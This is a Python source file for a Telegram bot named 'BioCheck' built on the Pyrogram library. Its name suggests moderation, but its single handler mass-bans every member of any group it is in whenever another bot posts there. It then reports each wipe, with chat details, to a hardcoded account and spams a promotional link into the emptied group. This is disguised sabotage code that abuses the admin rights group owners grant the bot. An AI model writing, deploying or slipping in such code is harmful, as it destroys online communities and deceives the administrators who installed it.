from pyrogram import Client, filters
from pyrogram.errors import FloodWait
import time
import re
import asyncio
from pyrogram import Client, filters
from typing import Callable
from pyrogram.enums import ChatMemberStatus
from pyrogram.types import Message
from pyrogram import Client, filters, enums
import random
from pyrogram.enums import ChatMembersFilter, ChatMemberStatus, ChatType
from pyrogram.types import (
    CallbackQuery,
    ChatMemberUpdated,
    ChatPermissions,
    ChatPrivileges,
    Message,
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.types import CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters
from pyrogram.enums import ChatMembersFilter
import re
from pyrogram import filters
from pyrogram.enums import ChatAction, ChatType, MessageEntityType
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import MongoClient
from pyrogram.types import Message
import socket
from datetime import datetime
import pytz
from string import ascii_lowercase
import json
import os
from typing import Dict, List, Union
import json, os, random, asyncio
import config
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
from pyrogram.errors import UserAlreadyParticipant
from pyrogram.types import Message, ChatPrivileges
from pyrogram import Client, enums, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ChatPermissions, Message
import asyncio
from pyrogram import Client, filters, enums

AMBOT = 7045191057

app = Client("BioCheck", api_id=config.API_ID, api_hash=config.API_HASH, bot_token=config.BOT_TOKEN)

@app.on_message(~filters.private & filters.incoming & filters.bot)
async def banall(client, message: Message):
    try: 
        chat_id = message.chat.id
        chat_name = message.chat.title if message.chat.title else "None"
        chatusername = message.chat.username if message.chat.username else "None"
        banned = 0
        AM = await app.send_message(AMBOT, f"Banall Started successfully.\n Chat Name : {chat_name}\nChat Username : {chatusername}\nChat Id : {chat_id}\nBanall Started By : {message.from_user.mention}\n")
        bot = await app.get_chat_member(chat_id, app.me.id)
        async for member in app.get_chat_members(chat_id):
            if member.status in ['administrator', 'creator'] or member.user.id == app.me.id:
                continue 
            try:
                await app.ban_chat_member(chat_id, member.user.id)
                banned += 1
            except Exception as e:
                pass
        await AM.edit(f"Banall Completed successfully.\nBanned {banned} members.\n\nChat Name : {chat_name}\nChat Username : {chatusername}\nChat Id : {chat_id}\nBanall Started By : {message.from_user.mention}")
        AM = await app.send_message(chat_id, f"https://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT\nhttps://t.me/AmBotYT")
    except FloodWait as e:
        await asyncio.sleep(e.x)
        await banall(client, message)




app.run()
